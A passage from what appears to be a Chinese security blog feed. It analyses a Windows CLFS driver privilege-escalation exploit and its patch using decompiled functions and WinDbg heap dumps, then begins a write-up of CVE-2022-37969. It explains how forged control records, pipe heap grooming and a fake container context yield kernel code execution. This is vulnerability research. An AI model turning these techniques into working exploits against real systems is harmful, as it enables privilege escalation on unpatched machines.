+0x399处的一个字节自增1，而该处和BaseLogRecord的rgContainers的高字节重叠，前面说过正常blf文件的rgContainers值为0x1470，在该处自增1后，高字节0x14自增就变为了0x15，导致该处值变为0x1570，从而导致后续定位主blf文件的container context时定位到了攻击者伪造的container context。</p><p>这里的问题是，该处原为给10个副blf文件添加日志容器，所以按正常来讲该处定位到的应该是副blf文件的base block，而不是主blf文件的base block。回到CClfsBaseFilePersisted::WriteMetadataBlock函数中，定位base block代码如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>v8<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(<span style="color:#ae81ff">24</span><span style="color:#f92672">*</span> v4<span style="color:#f92672">+</span><span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>));<span style="color:#75715e">// 获取偏移 (this+0x30h)</span></span></span></code></pre></div><p>其中*((_QWORD *)this + 6)为固定值(堆指针)，v4为传入WriteMetadataBlock的第二个参数，回溯到调用者，去除无关逻辑之后如下：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">ExtendMetadataBlock</span>(<span style="color:#66d9ef">__int64</span> a1,<span style="color:#66d9ef">int</span> a2,<span style="color:#66d9ef">int</span> a3)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> v3<span style="color:#f92672">=</span> a2;</span></span><span style="display:flex;"><span> v36<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v42<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v34<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span> EventObject<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetControlRecord</span>((CClfsBaseFile<span style="color:#f92672">*</span>)a1,<span style="color:#f92672">&amp;</span>v34);</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> EventObject<span style="color:#f92672">=</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">FlushControlRecord</span>((CClfsBaseFilePersisted<span style="color:#f92672">*</span>)a1);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ( k<span style="color:#f92672">=</span> EventObject; EventObject<span style="color:#f92672">>=</span><span style="color:#ae81ff">0</span>; k<span style="color:#f92672">=</span> EventObject )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>LABEL_41:</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>v12<span style="color:#f92672">!=</span><span style="color:#ae81ff">2</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> v27<span style="color:#f92672">=</span><span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)v34<span style="color:#f92672">+</span><span style="color:#ae81ff">0xD</span>);</span></span><span style="display:flex;"><span> v28<span style="color:#f92672">=</span><span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)v34<span style="color:#f92672">+</span><span style="color:#ae81ff">0xD</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( ((_WORD)v27<span style="color:#f92672">==</span><span style="color:#f92672">*</span>((_WORD<span style="color:#f92672">*</span>)v34<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span>)</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">IsShadowBlock</span>(v14, v27,<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)v34<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span>)))</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span><span style="color:#f92672">*</span> v27<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">>></span><span style="color:#ae81ff">9</span><span style="color:#f92672">&lt;</span><span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)v34<span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">ExtendMetadataBlockDescriptor</span>(</span></span><span style="display:flex;"><span> (CClfsBaseFilePersisted<span style="color:#f92672">*</span>)a1,</span></span><span style="display:flex;"><span> v28,</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)v34<span style="color:#f92672">+</span><span style="color:#ae81ff">9</span>)<span style="color:#f92672">>></span><span style="color:#ae81ff">1</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LOWORD</span>(v27)<span style="color:#f92672">=</span><span style="color:#f92672">*</span>v25;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">WriteMetadataBlock</span>((CClfsBaseFilePersisted<span style="color:#f92672">*</span>)a1, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span>)v27,<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)EventObject;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>WriteMetadataBlock的第二个参数来源于CClfsBaseFile::GetControlRecord的第二个参数，跟进CClfsBaseFile::GetControlRecord逻辑</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetControlRecord</span>(CClfsBaseFile<span style="color:#f92672">*</span>this,<span style="color:#66d9ef">struct</span> _CLFS_CONTROL_RECORD<span style="color:#f92672">**</span>a2)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a2<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v13<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v14<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> result<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">AcquireMetadataBlock</span>(this);</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span> result;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)result<span style="color:#f92672">>=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span> (_DWORD<span style="color:#f92672">*</span>)<span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>);<span style="color:#75715e">// 访问this+0x30处的指针，这个指针指向了0x90大小的heap</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v7<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)v6;<span style="color:#75715e">// 该段内存存储了一些内存指针，获取偏移0x0处的指针，这个指针指向了control block</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v8<span style="color:#f92672">=</span> v6[<span style="color:#ae81ff">2</span>];</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)v6<span style="color:#f92672">+</span><span style="color:#ae81ff">0x28</span>i64);<span style="color:#75715e">// 获取control block 0x28的数值</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v10<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)v6<span style="color:#f92672">+</span> v9;<span style="color:#75715e">// 将control block 0x28处数值和control block相加，计算control record</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v9<span style="color:#f92672">&lt;</span> v8<span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v9<span style="color:#f92672">>=</span><span style="color:#ae81ff">0x70</span><span style="color:#f92672">&amp;&amp;</span> v8<span style="color:#f92672">-</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v9<span style="color:#f92672">>=</span><span style="color:#ae81ff">0x68</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v11<span style="color:#f92672">=</span><span style="color:#ae81ff">24</span>i64<span style="color:#f92672">*</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)(v10<span style="color:#f92672">+</span><span style="color:#ae81ff">72</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v8<span style="color:#f92672">-</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v9<span style="color:#f92672">-</span><span style="color:#ae81ff">80</span><span style="color:#f92672">>=</span> v11 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (g_signatureOffsetsValidation<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (v12<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(v7<span style="color:#f92672">+</span><span style="color:#ae81ff">104</span>), v11<span style="color:#f92672">+</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(v9<span style="color:#f92672">+</span><span style="color:#ae81ff">80</span>)<span style="color:#f92672">&lt;=</span> v12)</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v12<span style="color:#f92672">&lt;=</span> v8</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">RtlULongMult</span>(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)(v7<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>),<span style="color:#ae81ff">2u</span>,<span style="color:#f92672">&amp;</span>v13)<span style="color:#f92672">>=</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">RtlULongAdd</span>(v12, v13,<span style="color:#f92672">&amp;</span>v14)<span style="color:#f92672">>=</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> v14<span style="color:#f92672">&lt;=</span> v8 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a2<span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> _CLFS_CONTROL_RECORD<span style="color:#f92672">*</span>)v10;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> v5;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( WPP_GLOBAL_Control<span style="color:#f92672">!=</span><span style="color:#f92672">&amp;</span>WPP_GLOBAL_Control<span style="color:#f92672">&amp;&amp;</span> (<span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)WPP_GLOBAL_Control<span style="color:#f92672">+</span><span style="color:#ae81ff">11</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0x8000000</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span><span style="color:#a6e22e">WPP_SF_sdLLH</span>(<span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)WPP_GLOBAL_Control<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>));</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0xC01A000D</span>i64;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> result;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>分析该代码，虽然this参数为CClfsBaseFile *类型，但在调用CClfsBaseFile::GetControlRecord的CClfsBaseFilePersisted::ExtendMetadataBlock函数中传入的该参数原类型为CClfsBaseFilePersisted。</p><p>该代码最终计算a2的逻辑为从this+30处取得指针并解引用，获得control block地址，而后解引用该地址并在偏移0x28处取得一个偏移，将这个偏移和control block相加获得control record地址并赋给a2.</p><p>在调试器中可以看到该偏移为0x70，即从control block +0x70位置定位到了control record</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0: kd> db ffffe381`a5c7f680 + 0x28</span></span><span style="display:flex;"><span>ffffe381`a5c7f6a8 70 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 p...............</span></span></code></pre></div><p>回到CClfsBaseFilePersisted::ExtendMetadataBlock函数中，在取得control record之后，在control record+0x1a处取得值并作为第二个参数传入CClfsBaseFilePersisted::WriteMetadataBlock中，该处取得值为0x13</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0: kd> db ffffe381`a5c7f680 + 0x70 + 0x1a</span></span><span style="display:flex;"><span>ffffe381`a5c7f70a 13 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................</span></span></code></pre></div><p>根据前面CClfsBaseFilePersisted::WriteMetadataBlock的逻辑可知，在第二个参数传入0x13之后计算的偏移为0x18*0x13=0x1c8，即从poi(CClfsBaseFilePersisted+0x30)+0x1c8取得值并获取poi(poi(CClfsBaseFilePersisted+0x30)+0x1c8)+0x28处的偏移。</p><p>在前面分析CClfsBaseFilePersisted结构知道，0x30偏移处指向的堆内存大小只有0xa0</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0: kd> !pool ffffa289`19254810</span></span><span style="display:flex;"><span>Pool page ffffa28919254810 region is Nonpaged pool</span></span><span style="display:flex;"><span> ffffa28919254080 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254120 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa289192541c0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254260 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254300 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa289192543a0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254440 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa289192544e0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254580 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254620 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa289192546c0 size: a0 previous size: 0 (Allocated) Clfs</span></span><span style="display:flex;"><span> ffffa28919254760 size: a0 previous size: 0 (Free) Vad</span></span><span style="display:flex;"><span>*ffffa28919254800 size: a0 previous size: 0 (Allocated) *Clfs</span></span><span style="display:flex;"><span> Pooltag Clfs : CLFS General buffer, or owner page lookaside list, Binary : clfs.sys</span></span><span style="display:flex;"><span> ffffa289192548a0 size: a0 previous size: 0 (Allocated) Clfs</span></span><span style="display:flex;"><span> ffffa28919254940 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa289192549e0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254a80 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254b20 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254bc0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254c60 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254d00 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254da0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254e40 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254ee0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span></code></pre></div><p>当使用0x1c8访问时会产生越界，此时读取到的实际是使用pipe WriteFile时申请的堆，此前通过pipe写入了主blf文件的base block+0x30，所以该处读取到的地址实际上是主blf文件的base block + 0x30。</p><p>经过poi(poi(CClfsBaseFilePersisted+0x30)+0x1c8)+0x28运算会取到主blf文件的base block + 0x58的位置，而该位置值已经被修改为了0x369.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0: kd> dq ffffa289`19254810 + 0x1c8</span></span><span style="display:flex;"><span>ffffa289`192549d8 ffffe381`a2303030 7246704e`0a0a0000</span></span><span style="display:flex;"><span>ffffa289`192549e8 5e85fe62`4567d0ee ffffe381`a9cb4258</span></span><span style="display:flex;"><span>ffffa289`192549f8 ffffe381`a9cb4258 00000000`00000000</span></span><span style="display:flex;"><span>ffffa289`19254a08 ffffe381`a90c79c0 00000060`00000000</span></span><span style="display:flex;"><span>ffffa289`19254a18 00000000`00000060 ffffe381`a2303030</span></span><span style="display:flex;"><span>ffffa289`19254a28 ffffe381`a2303030 ffffe381`a2303030</span></span><span style="display:flex;"><span>ffffa289`19254a38 ffffe381`a2303030 ffffe381`a2303030</span></span><span style="display:flex;"><span>ffffa289`19254a48 ffffe381`a2303030 ffffe381`a2303030</span></span><span style="display:flex;"><span>0: kd> !pool ffffa289`19254810+0x1c8</span></span><span style="display:flex;"><span>Pool page ffffa289192549d8 region is Nonpaged pool</span></span><span style="display:flex;"><span> ffffa28919254080 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254120 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa289192541c0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254260 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254300 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa289192543a0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254440 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa289192544e0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254580 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254620 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa289192546c0 size: a0 previous size: 0 (Allocated) Clfs</span></span><span style="display:flex;"><span> ffffa28919254760 size: a0 previous size: 0 (Free) Vad</span></span><span style="display:flex;"><span> ffffa28919254800 size: a0 previous size: 0 (Allocated) Clfs</span></span><span style="display:flex;"><span> ffffa289192548a0 size: a0 previous size: 0 (Allocated) Clfs</span></span><span style="display:flex;"><span>*ffffa28919254940 size: a0 previous size: 0 (Allocated) *NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> Pooltag NpFr : DATA_ENTRY records (read/write buffers), Binary : npfs.sys</span></span><span style="display:flex;"><span> ffffa289192549e0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254a80 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254b20 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254bc0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254c60 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254d00 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254da0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254e40 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254ee0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span></code></pre></div><p>之后通过运算poi(0x369+ base block + 0x30)++实际上让主blf文件的base block+0x399自增1。最终在对主blf文件调用CreateLogFile是定位到的container context偏移为0x1570，找到了攻击者伪造的恶意contener context，在通过pContainer对象执行到了用户层内存0x5000000之中。</p><p><strong>补丁分析</strong></p><p><strong>Win10 21H2</strong></p><p>diff补丁，可发现补丁主要修改了CClfsBaseFile::GetControlRecord、CClfsBaseFile::AcquireMetadataBlock，同时新增了一个函数CClfsLogFcbPhysical::ValidateScratchBlockOffsets，在CClfsLogFcbPhysical::SetEndOfLog和CClfsLogFcbPhysical::RecoverTruncateLog中引用。</p><p><strong>Win11 21H2</strong></p><p><strong>小结</strong></p><p>在CVE-2022-37969中是通过前一个blf文件的错误的cbSymbolZone修改了下一个blf文件的conteiner context的pContaienr对象指针，从而在后续定位CClfsContainer对象时访问到了用户层内存，达成攻击流程，该漏洞利用需要通过循环创建blf文件来达到稳定的堆内存结构，从而使得后续可以成功修改后面的blf文件的conteiner context。</p><p>在CVE-2022-37969补丁中增加了对client context、cbSymbolZone越界检测，从而不能直接通过这种方法损坏conteiner context对象指针。</p><p>在本次漏洞利用中，巧妙地通过伪造control record的数据来造成越界读取，从而修改另外的base block数据，该处修改是通过指针定位到指定的内存，所以不用像CVE-2022-37969中通过反复创建blf文件来达成一种稳定的内存间隙状态，但利用过程中仍然需要通过布局内存使得在越界读取时读取到的是指定的内存地址。</p><p><strong>参考链接</strong></p><blockquote><p><a href="https://www.secrss.com/articles/54881" target="_blank">https://www.secrss.com/articles/54881</a></p><p><a href="https://www.anquanke.com/post/id/288808" target="_blank">https://www.anquanke.com/post/id/288808</a></p></blockquote><p><a href="https://securelist.com/nokoyawa-ransomware-attacks-with-windows-zero-day/109483/" target="_blank">https://securelist.com/nokoyawa-ransomware-attacks-with-windows-zero-day/109483/</a></p><p><strong>Created at 2023-05-31T19:44:15+08:00</strong></p></description></item><item><title>CVE-2022-37969</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/</link><pubDate>Fri, 26 May 2023 10:56:00 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/</guid><description><h3 id="基本信息">基本信息</h3><p>blf日志文件结构</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/1.png"/></p><p>基本日志块存储了基本日志文件关联的客户端和容器上下文信息</p><p>基本日志块由6个meta数据块组成，分别是控制块、基本块、截断块以及对应的shadow块，每个块由日志块头开始，大小为0x70 bytes</p><p>日志块头定义：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _CLFS_LOG_BLOCK_HEADER</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> UCHAR MajorVersion;</span></span><span style="display:flex;"><span> UCHAR MinorVersion;</span></span><span style="display:flex;"><span> UCHAR Usn;</span></span><span style="display:flex;"><span> CLFS_CLIENT_ID ClientId;</span></span><span style="display:flex;"><span> USHORT TotalSectorCount;</span></span><span style="display:flex;"><span> USHORT ValidSectorCount;</span></span><span style="display:flex;"><span> ULONG Padding;</span></span><span style="display:flex;"><span> ULONG Checksum;</span></span><span style="display:flex;"><span> ULONG Flags;</span></span><span style="display:flex;"><span> CLFS_LSN CurrentLsn;</span></span><span style="display:flex;"><span> CLFS_LSN NextLsn;</span></span><span style="display:flex;"><span> ULONG RecordOffsets[<span style="color:#ae81ff">16</span>];</span></span><span style="display:flex;"><span> ULONG SignaturesOffset;</span></span><span style="display:flex;"><span>} CLFS_LOG_BLOCK_HEADER,<span style="color:#f92672">*</span>PCLFS_LOG_BLOCK_HEADER;</span></span></code></pre></div><p>内存布局</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/1.png"/></p><p>SignatureOffset是了在内存中存储每个扇区签名的数组的偏移。扇区签名位于每个扇区的末尾，大小两个字节，由扇区块类型（1 字节）和 USN（1 字节）组成。<strong>每个扇区大小为0x200。</strong></p><p>在BLF文件中，基本块从偏移0x800开始，到0x81FF，以日志块头开始，然后是基本记录头</p><p>基本记录头定义如下,大小为1338，到偏移1BA8处</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _CLFS_METADATA_RECORD_HEADER</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> ULONGLONG ullDumpCount;</span></span><span style="display:flex;"><span>} CLFS_METADATA_RECORD_HEADER,<span style="color:#f92672">*</span> PCLFS_METADATA_RECORD_HEADER;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _CLFS_BASE_RECORD_HEADER</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> CLFS_METADATA_RECORD_HEADER hdrBaseRecord;</span></span><span style="display:flex;"><span> CLFS_LOG_ID cidLog;</span></span><span style="display:flex;"><span> ULONGLONG rgClientSymTbl[CLIENT_SYMTBL_SIZE];</span></span><span style="display:flex;"><span> ULONGLONG rgContainerSymTbl[CONTAINER_SYMTBL_SIZE];</span></span><span style="display:flex;"><span> ULONGLONG rgSecuritySymTbl[SHARED_SECURITY_SYMTBL_SIZE];</span></span><span style="display:flex;"><span> ULONG cNextContainer;</span></span><span style="display:flex;"><span> CLFS_CLIENT_ID cNextClient;</span></span><span style="display:flex;"><span> ULONG 